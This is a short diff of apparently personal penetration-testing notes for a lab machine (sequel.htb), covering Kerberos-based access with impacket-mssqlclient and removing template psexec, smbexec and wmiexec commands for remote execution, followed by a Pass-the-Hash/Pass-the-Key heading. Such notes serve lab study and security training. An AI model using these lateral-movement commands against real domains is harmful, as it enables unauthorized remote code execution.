@@ -420,10 +420,8 @@ Klist to view kerberos tickets
 /etc/hosts:
 192.168.227.21  sequel.htb dc.sequel.htb
 
+#Always remember to sync the kdc time
 impacket-mssqlclient -k dc.sequel.htb
-python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 ###### Pass The Hash/Pass The Key
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
